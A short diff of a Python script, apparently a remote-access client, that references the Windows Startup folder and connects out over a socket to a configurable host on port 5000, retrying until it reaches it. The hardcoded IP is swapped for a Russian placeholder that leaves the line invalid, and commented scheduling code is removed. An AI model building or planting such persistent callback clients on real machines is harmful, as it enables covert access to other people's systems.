@@ -11,7 +11,7 @@ if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start
 
 
 def client():
-    host = '192.168.0.11'
+    host = # необходимый ip-адресс
     port = 5000
     client_socket = socket.socket()
     client_socket.connect((host, port))
@@ -34,7 +34,4 @@ if __name__ == '__main__':
         except ConnectionRefusedError:
             print('try')
             continue
-# from redis import Redis
-# from rq import Queue
-# q = Queue(connection=Redis())
-# q.enqueue_at(datetime(2021, 01, 20, 8, 0), server)
+
